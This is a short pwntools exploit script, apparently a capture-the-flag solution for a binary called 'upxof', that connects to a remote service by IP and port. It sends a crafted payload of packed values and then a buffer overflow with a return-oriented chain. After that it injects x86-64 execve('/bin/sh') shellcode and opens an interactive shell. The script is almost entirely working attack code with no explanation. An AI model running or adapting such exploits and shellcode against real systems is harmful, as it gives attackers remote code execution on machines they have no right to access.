from pwn import *
rdi=0x0000000000800766
#p=process("./upxof")
p=remote("10.21.13.69",1025)
p.readuntil("password:")
"""
gdb.attach(p,'''
b *0x400a2e
c
b *0x400c93
c
b *0x800b4e
c
c
c
c
b *0x800d91
c
b *0x4005e9
c
si
si
si
si
si
si
si
b *0x7ffff7a99f40
c
c
b *0x7ffff7a9a08e
''')
"""
#context.log_level='debug'
s=p64(0)*14+p64(0x1)+p64(0x600100)+p64(0)
s+=p64(0x600100)*23+p64(0)
s+=p64(0x21)+p64(0x600100)+p64(0x10)+p64(0xf8bfbff)+p64(6)+p64(0x1000)+p64(0x11)+p64(0x64)+p64(3)+p64(0x400040)
s+=p64(0x4)+p64(0x38)+p64(0x5)+p64(2)+p64(7)+p64(0)+p64(8)+p64(0)+p64(9)+p64(0x400988)
s+=p64(0xb)+p64(0x3e8)+p64(0xc)+p64(0x3e8)+p64(0xd)+p64(0x3e8)+p64(0xe)+p64(0x3e8)+p64(0x17)
s+=p64(0)+p64(0x19)
s+=p64(0x600100)+p64(0x1f)+p64(0x600100)+p64(0xf)+p64(0x600100)
p.sendline("12345678"+s)
addr=0x00602000-0x200
p.sendlineafter("let's go:","\x00"*0x408+p64(0)+p64(addr+0x80-0x8)+p64(rdi)+p64(addr)+p64(0x400763)+p64(0x400763)+p64(0x400763))
context.arch='amd64'
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode=shellcode.ljust(0x80,'\x00')+p64(addr)
p.sendline(shellcode)
p.interactive()


